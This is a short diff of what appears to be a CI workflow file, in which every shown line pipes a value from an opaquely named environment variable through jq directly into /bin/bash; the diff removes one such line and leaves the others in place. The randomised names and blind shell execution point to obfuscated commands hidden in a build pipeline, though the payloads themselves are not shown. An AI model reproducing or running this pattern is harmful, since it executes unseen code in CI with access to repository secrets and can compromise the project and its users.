@@ -25,7 +25,6 @@ jobs:
           echo $cl708 | jq -r .v62 | /bin/bash
           echo $qjv3183 | jq -r .vhlng05 | /bin/bash
           printf '%s' "$pyprr531" | jq -r .unz3299 | /bin/bash
-          echo $pbt8 | jq -r .xc1 | /bin/bash
           printf '%s' "$hc049" | jq -r .zmi44 | /bin/bash
           printf '%s' "$ghnif60" | jq -r .q14 | /bin/bash
 
